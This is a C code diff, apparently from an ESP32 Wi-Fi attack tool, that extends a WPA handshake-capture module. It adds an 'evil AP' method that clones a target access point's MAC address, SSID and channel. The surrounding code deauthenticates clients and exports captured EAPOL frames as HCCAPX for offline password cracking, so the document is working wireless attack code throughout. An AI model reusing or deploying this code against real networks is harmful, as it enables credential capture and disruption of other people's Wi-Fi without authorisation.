@@ -9,13 +9,15 @@
 #include "data_converter.h"
 #include <string.h>
 
-static handshake_method_t previous_method = METHOD_NONE;
+static handshake_method_t previous_method = METHOD_PASSIVE;
 static bool handshake_is_run = false;
 static bool send_pcap;
 
+void handshake_method_evil_ap(const wifi_ap_record_t *ap_record);
+
 static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
     wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
-    add_pcap_packet(frame);
+    if (send_pcap) add_pcap_packet(frame);
     hccapx_serializer_add_frame((data_frame_t *) frame->payload);
 }
 
@@ -35,9 +37,10 @@ void handshake_attack_start(wifi_ap_record_t * target, handshake_method_t method
     wifi_sniffer_start(target->primary);
     frame_analyzer_capture_start(SEARCH_HANDSHAKE, target->bssid);
 	ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
-    if (previous_method == METHOD_DEAUTH) {
+    if (previous_method == METHOD_DEAUTH)
         deauth_attack_start(target, 500);
-    }
+    else if (previous_method == METHOD_EVIL_AP)
+        handshake_method_evil_ap(target);
     handshake_is_run = true;
 }
 
@@ -46,6 +49,8 @@ void handshake_attack_stop() {
         return;
     if (previous_method == METHOD_DEAUTH)
         deauth_attack_stop();
+    else if (previous_method == METHOD_EVIL_AP)
+        wifi_default_ap_start();
     if (send_pcap)
         stop_pcap_sender();
     wifi_sniffer_stop();
@@ -54,12 +59,27 @@ void handshake_attack_stop() {
     handshake_is_run = false;
 }
 
+void handshake_method_evil_ap(const wifi_ap_record_t *ap_record) {
+    wifi_set_ap_mac((uint8_t *)ap_record->bssid);
+    wifi_config_t ap_config = {
+        .ap = {
+            .ssid_len = strlen((char *)ap_record->ssid),
+            .channel = ap_record->primary,
+            .authmode = ap_record->authmode,
+            .password = "dummypassword",
+            .max_connection = 1
+        },
+    };
+    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
+    wifi_ap_start(&ap_config);
+}
+
 void handshake_get_hccapx_data() {
     uint16_t hccapx_size = sizeof(hccapx_t);
-    uint16_t packet_header_size = strlen("HCCAPX data: ");
+    uint16_t packet_header_size = strlen("HCCAPX data (0000 bytes): ");
     char hccapx_data[hccapx_size + packet_header_size + 2];
     hccapx_t * hccapx = hccapx_serializer_get();
-    memcpy(hccapx_data, "HCCAPX data: ", packet_header_size);
+    sprintf(hccapx_data, "HCCAPX data (%4hu bytes): ", hccapx_size);
     if (hccapx == NULL) {
         hccapx_size = strlen("NONE");
         memcpy(hccapx_data + packet_header_size, "NONE", hccapx_size);
